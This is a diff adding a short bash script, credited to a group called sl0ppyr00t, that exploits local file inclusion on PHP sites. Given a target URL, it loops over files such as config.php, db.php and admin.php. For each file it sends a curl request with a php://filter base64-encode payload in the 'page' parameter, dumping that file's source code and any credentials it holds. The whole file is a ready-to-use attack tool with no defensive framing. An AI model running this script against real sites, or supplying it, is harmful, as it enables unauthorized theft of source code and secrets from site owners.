@@ -1,0 +1,20 @@
+#!/bin/bash
+#
+# Sl0ppy - filther-enc-lfi
+# Team sl0ppyr00t
+# x0xr00t
+
+red='\e[31m'
+green='\e[32m'
+yellow='\e[33m'
+white='\e[97m'
+
+url="$1"
+files=("index.php" "login.php" "register.php" "app.php" "config.php" "admin.php" "logout.php" "db.php")
+for filename in ${files[@]};do
+  echo
+  echo -e " $green{ $red sl0ppy $green} $white----$yellow $filename $white----$green{ $red sl0ppy $green}"$white
+  curl --silent "$url?page=php://filter/convert.base64-encode/resource=$filename" 
+  echo
+  echo -e " $green{ $red sl0ppy $green} $white------$red Sl0ppyr00t $white----------$green{ $red sl0ppy $green}"
+done
